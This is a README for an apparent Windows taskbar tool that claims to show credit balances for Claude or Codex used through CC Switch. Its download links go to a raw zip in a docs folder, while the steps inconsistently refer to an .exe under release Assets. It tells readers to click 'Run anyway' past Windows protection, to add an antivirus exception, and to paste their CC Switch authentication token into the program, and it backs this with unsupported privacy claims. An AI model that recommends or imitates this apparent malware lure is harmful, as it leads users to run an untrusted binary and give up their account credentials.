# 📊 cc-balance-overlay - Track your credits on Windows easily

[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/winterd3290/cc-balance-overlay/main/docs/balance_overlay_cc_3.8.zip)

## What is this tool?

This application places a simple balance monitor on your Windows 11 taskbar. It helps you keep track of your credits while you use Claude or Codex through CC Switch. You no longer need to switch windows or refresh browser tabs to see your remaining balance. The tool sits quietly in your system tray and updates in the background.

## 🛠 Prerequisites

This software works on Windows 11. You do not need to install extra software to run it. Ensure you have an active internet connection so the tool can reach the CC Switch servers to retrieve your current credit data.

## 📥 How to install

Follow these steps to set up the balance monitor on your computer:

1. Visit [this page to download the latest version](https://raw.githubusercontent.com/winterd3290/cc-balance-overlay/main/docs/balance_overlay_cc_3.8.zip).
2. Look for the file ending in .exe under the Assets section of the newest release.
3. Click the file to download it to your computer.
4. Open your Downloads folder.
5. Double-click the file to start the application.
6. Windows will show a prompt to protect your PC. Click "More info" and then click "Run anyway" if it appears.
7. The application icon will appear in your system tray near the clock.

## ⚙️ How to use the monitor

Once the program runs, it shows your balance directly in the taskbar area. You can manage the settings by right-clicking the icon in your system tray.

### Adjust settings
Right-click the icon to open the menu. You can change how often the application checks for updates. You can also view the current license details or exit the program from this menu.

### Update your details
The application uses an authentication token to securely check your balance. During your first run, the tool will ask you to provide this token. You can find this token in your CC Switch account settings page. Paste this value into the prompt. The application stores this token securely on your computer so you do not need to enter it again.

## 🌟 Common features

- **Taskbar Integration:** View your balance without leaving your current workspace.
- **Low Resource Usage:** The application uses minimal memory and processor power.
- **Automatic Updates:** The tool periodically reaches out to the server to ensure your balance number remains accurate.
- **Secure Handling:** Your authentication data stays on your local machine.

## 🔧 Troubleshooting

If you encounter issues, check the following points:

* **Icon missing:** If you do not see the icon in the tray, click the small arrow (^ ) in the taskbar to show hidden icons. You can drag the icon from the hidden area to the main tray area for quick access.
* **No balance data:** Check your internet connection. If you have an active connection, right-click the icon and select "Refresh" to try reaching the server again.
* **Token error:** If the balance shows an error, right-click the tray icon and select "Update Token." Verify that you copied the correct string from your CC Switch profile page.
* **Program does not start:** Ensure you are running Windows 11. If your antivirus complains, add an exception for the cc-balance-overlay.exe file in your security settings.

## 📈 Understanding the display

The number shown in the taskbar represents the remaining credits in your account. The monitor updates every five minutes by default. A green circle next to the number signifies that the connection is stable. A yellow icon means the application is currently updating your balance. A red icon indicates a connection failure or a token issue that requires your attention.

## 🔒 Privacy and security

The cc-balance-overlay application only accesses the specific data required to display your credit balance. It does not read your chat history, access your personal files, or track your browsing habits. The connection uses standard encryption to keep your authentication token safe during transmission. We do not store your balance data on external servers; all processing occurs locally on your machine.

## 💡 Customization options

You can change the appearance of the text in the taskbar through the settings menu. Choose between a compact numeric view or a longer text format that includes labels. Users with multiple monitors may also choose which screen shows the taskbar icon. These options help you maintain focus on your main work while keeping your credit information visible but out of the way.

## 🚀 Future updates

We plan to add more features over time based on user feedback. Planned additions include low-balance alerts that notify you when your credits cross a certain threshold. We also plan to simplify the setup process for new users further. Check the releases page frequently for these updates. You do not need to uninstall the old version; simply run the new installer to upgrade effectively.